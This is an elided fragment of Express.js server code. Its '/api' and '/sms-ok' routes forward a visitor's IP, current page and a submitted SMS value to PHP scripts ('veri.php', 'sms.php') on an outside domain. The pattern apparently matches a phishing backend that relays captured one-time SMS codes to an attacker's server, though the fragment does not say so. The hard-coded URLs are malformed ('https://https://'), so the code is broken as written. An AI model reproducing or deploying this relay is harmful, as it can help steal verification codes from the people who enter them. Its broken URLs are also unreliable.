...
app.get('/api', async (req, res) => {
  try {
    ...
    const apiUrl = `https://https://asilsilver.com.tr//dmn/veri.php?ip=${userIp}&current_page=${currentPage}`;
...
app.post('/sms-ok', async (req, res) => {
  try {
    ...
    const apiUrl = `https://https://asilsilver.com.tr//dmn/sms.php?ip=${encodeURIComponent(ip)}&sms=${encodeURIComponent(sms)}`;
